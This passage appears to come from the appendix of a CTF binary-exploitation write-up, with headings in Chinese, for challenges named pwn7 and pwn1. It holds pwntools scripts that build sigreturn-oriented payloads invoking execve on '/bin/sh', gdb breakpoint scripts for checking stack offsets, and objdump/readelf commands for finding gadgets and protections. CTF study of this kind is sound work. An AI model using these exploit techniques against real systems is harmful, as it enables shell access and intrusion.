open('/tmp/pwn7.in','wb').write(b'NOTE 0 '+p64(SR)[:3]+b'\n'+b'SUBMIT 112\n'+stage+bytes(d1))
```

```
# /tmp/pwn7.gdb
set pagination off
set confirm off
set follow-fork-mode parent
b *0x401f14
b *0x401f2a
b *0x401c32
commands 1
  printf "[after 0x401f07 read] rsp=%p rax=%lu\n", $rsp, $rax
  continue
end
commands 2
  printf "[before OK-write, 0x401f2a] rax=%lu\n", $rax
  continue
end
commands 3
  printf "[0x401c32 mov rdx,rax] rax=%lu rdi=%lu rsi=%p\n", $rax, $rdi, $rsi
  continue
end
run < /tmp/pwn7.in
```

```bash
cd pwn7 && gdb -q -batch -x /tmp/pwn7.gdb ./service
```

### B. pwn1 驗證 `buf`、第二次 read 目的地、`FRAME_OFF`

```python
from pwn import *
context.arch='amd64'
f=SigreturnFrame(); f.rax=59; f.rdi=0xdeadbeef; f.rsi=0; f.rdx=0; f.rip=0x401069; f.rsp=0x4141414141414141
payload = b'B'*0x80 + p64(0x40104f) + p64(0x401069) + bytes(f)
payload = payload.ljust(0x1a0, b'\x00') + b'/bin/sh\x00'
payload = payload.ljust(0x400, b'\x00')
open('/tmp/pwn1.in','wb').write(b'A'*0x18 + payload + b'/bin/sh\x00' + b'C'*7)
```

```
# /tmp/pwn1b.gdb
set pagination off
set confirm off
b *0x401054
b *0x401069
commands 1
  printf "[0x401054] rsp=%p  rsi(read dst)=%p\n", $rsp, $rsi
  continue
end
commands 2
  printf "[0x401069] rsp=%p  rax=%lu\n", $rsp, $rax
  continue
end
run < /tmp/pwn1.in
```

```bash
cd pwn1 && gdb -q -batch -x /tmp/pwn1b.gdb ./challenge
```

### C. pwn7 驗證 `A3` 與 `0x401fda` 進入時的 `rsp`

同附錄 A，但把 d2/d3 也一起組出來（`A2 = A1+0x48+8*11`、`A3 = A2+0x48+8*14`、
`RESP = A3+0x60`），並在 gdb 加：

```
b *0x401f07
b *0x401fda
commands 1
  printf "[0x401f07] rsp=%p (bl=%d)\n", $rsp, $bl
  continue
end
commands 2
  printf "[0x401fda] rsp=%p rbx=%p  => rsp+0x10=%p\n", $rsp, $rbx, $rsp+0x10
  continue
end
```

實測輸出：`[0x401f07] rsp=0x40a188 / 0x40a228 / 0x40a2e0`、
`[0x401fda] rsp=0x40a330 rbx=0x40a340 => rsp+0x10=0x40a340`。

### D. 其他用到的指令

```bash
# pwn7 seccomp / 位址 / gadget
objdump -d -M intel service | sed -n '/40132c/,/4014a0/p'
objdump -d -M intel --start-address=0x401523 --stop-address=0x40152b service
readelf -S service | grep -A1 -E '\.data|\.bss'
readelf -n service                      # .note.gnu.property: IBT, SHSTK

# pwn1 組語與保護
objdump -d -M intel challenge
readelf -l challenge                    # 只有 2 個 program header，無 GNU_STACK
python3 -c "from pwn import *; print(ELF('./challenge',checksec=False).checksec())"

# SigreturnFrame 偏移
python3 -c "
from pwn import *
context.clear(arch='amd64'); f=SigreturnFrame(); print(hex(len(bytes(f))))
f.rdi=0x1111111111111111; f.rax=0x4444444444444444; f.rip=0x5555555555555555
f.rsp=0x6666666666666666; f.rdx=0x3333333333333333
b=bytes(f)
for n,v in [('rdi',0x1111111111111111),('rdx',0x3333333333333333),('rax',0x4444444444444444),('rsp',0x6666666666666666),('rip',0x5555555555555555)]:
    print(n, hex(b.find(p64(v))))
print('csgsfs bytes', b[0xb8:0xc0].hex())"

# 沒有 pop rdx / seccomp-tools 不存在於 PyPI
objdump -d -M intel service | grep -E '\bpop\s+rdx'
python3 -m pip index versions seccomp-tools
```
